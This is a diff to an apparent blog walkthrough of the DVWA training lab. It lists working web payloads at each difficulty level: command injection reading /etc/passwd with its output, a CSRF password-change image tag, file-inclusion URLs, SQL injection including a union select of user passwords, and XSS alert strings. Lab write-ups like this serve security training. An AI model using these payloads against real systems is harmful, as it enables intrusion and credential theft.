@@ -8,12 +8,14 @@ name: damn-vulnerable-web-app
 #Brute force
 
 Low:
+
 Running burp intruder with admin as pass and default password wordlist as a payload
 
 Medium:
 
 
 High:
+
 Running burp intruder and grepping for csrf tokens and default password list as a payload, pitch fork for targeting
 
 #Command Injection
@@ -22,6 +24,7 @@ Low:
 
 Right off the bat, passing: ; cat /etc/passwd
 
+{% highlight bash %}
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -45,9 +48,11 @@ systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/
 systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
 systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
 mysql:x:104:107:MySQL Server,,,:/nonexistent:/bin/false
+{% endhighlight %}
 
 Medium:
 
+{% highlight bash %}
 | cat /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
@@ -73,9 +78,11 @@ systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/
 systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
 systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
 mysql:x:104:107:MySQL Server,,,:/nonexistent:/bin/false
+{% endhighlight %}
 
 High:
 
+{% highlight bash %}
 | cat /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
@@ -101,12 +108,15 @@ systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/
 systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
 systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
 mysql:x:104:107:MySQL Server,,,:/nonexistent:/bin/false
+{% endhighlight %}
 
 #CSRF
 
 Low: 
 
+{% highlight html %}
 <html><head><title></title></head><body><img src="http://127.0.0.1/vulnerabilities/csrf/?password_new=password&password_conf=password" /></body></html>
+{% endhighlight %}
 
 Medium:
 
@@ -116,11 +126,15 @@ High:
 
 Low:
 
+{% highlight bash %}
 http://127.0.0.1/vulnerabilities/fi/?page=/etc/passwd
+{% endhighlight %}
 
 Medium:
 
+{% highlight bash %}
 http://127.0.0.1/vulnerabilities/fi/?page=file:///etc/hosts
+{% endhighlight %}
 
 High:
 
@@ -140,6 +154,8 @@ High:
 
 #CAPTCHA
 
+Didn't seem to work at all out of the box
+
 Low:
 
 Medium:
@@ -151,17 +167,24 @@ High:
 
 Low:
 
+{% highlight sql %}
 1' or 1 = 1
+{% endhighlight %}
 
 Medium:
 
+{% highlight sql %}
 id=3 or 1 = 1&Submit=Submit intercepting with burp
+{% endhighlight %}
 
 High:
 
+{% highlight sql %}
 ID: 1' or 1 = 1 union select user,password from users  #
+{% endhighlight %}
 
 ID: 1' or 1 = 1 union select user,password from users  #
+
 First name: admin
 Surname: admin
 
@@ -206,15 +229,21 @@ Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 
 Low:
 
+{% highlight sql %}
 2' and 'a' = 'a
+{% endhighlight %}
 
 Medium:
 
+{% highlight sql %}
 id=1 and 1 != 2 &Submit=Submit in burp
+{% endhighlight %}
 
 High:
 
+{% highlight sql %}
 1' and '' = '
+{% endhighlight %}
 
 
 #XSS Reflected
@@ -235,12 +264,22 @@ High:
 
 Low:
 
-Message: <script>alert(1)</script>
+Message: 
+
+{% highlight bash %}
+<script>alert(1)</script>
+{% endhighlight %}
 
 Medium:
 
-Message: <svg onload="alert(1)">
+Message: 
+{% highlight html %}
+<svg onload="alert(1)">
+{% endhighlight %}
 
 High:
 
-Message: <a href="#" onmouseover="alert(1)">adf</a>
+Message: 
+{% highlight html %}
+<a href="#" onmouseover="alert(1)">adf</a>
+{% endhighlight %}
